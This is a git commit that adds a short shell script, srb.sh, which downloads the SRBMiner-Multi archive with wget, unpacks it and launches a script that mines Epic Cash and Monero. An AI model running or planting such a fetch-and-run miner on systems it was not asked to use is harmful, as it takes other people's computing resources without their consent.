a9f60e734870c261bac545131ea84d2131526aa1
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-29 10:52:28 -0300

    Create srb.sh

---
+++ srb.sh
@@ -0,0 +1,5 @@
+# srbminer
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.9/SRBMiner-Multi-0-6-9-Linux.tar.xz
+tar -xf SRBMiner-Multi-0-6-9-Linux.tar.xz
+cd SRBMiner-Multi-0-6-9
+./start-mining-epiccash-and-monero.sh
